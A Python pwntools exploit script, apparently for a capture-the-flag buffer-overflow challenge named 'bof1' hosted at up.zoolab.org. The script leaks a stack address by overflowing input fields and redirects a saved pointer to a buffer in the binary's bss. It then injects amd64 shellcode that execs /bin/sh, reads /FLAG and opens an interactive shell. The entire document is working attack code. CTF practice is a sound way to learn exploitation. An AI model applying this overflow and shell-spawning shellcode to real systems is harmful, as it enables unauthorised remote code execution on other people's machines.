#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './challenges/bof1'
port = 10258

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)


# pause()

r.recvuntil(b'name? ')
payloads = b'A' * 40
r.send(payloads)
z = r.recvline()
print("rec: ", z)
hex_rbp = hex(u64(z.split(payloads)[1][:-1].ljust(8, b'\x00')))
print(hex_rbp)


r.recvuntil(b'number? ')
payloads = b'A' * 40
r.send(payloads)
z = r.recvline()
hex_rbp = hex(u64(z.split(payloads)[1][:-1].ljust(8, b'\x00')))
print(hex_rbp)

# 00000000000d31e0 <msg> in bss
msg = 0xd31e0
main =  0x8a44 + 0xa0       # 8ae4 <main+0xa0>
msg_ptr = int(hex_rbp, 16) - main + msg

r.send(payloads + p64(msg_ptr))

codes = """
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp

mov rsi, 0
mov rdx, 0
mov rax, 59
syscall

mov rdi, 0
mov rax, 60
syscall
"""

payloads = asm(codes)
r.send(payloads)


r.send(b'cat /FLAG\n')
print(r.recv())

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :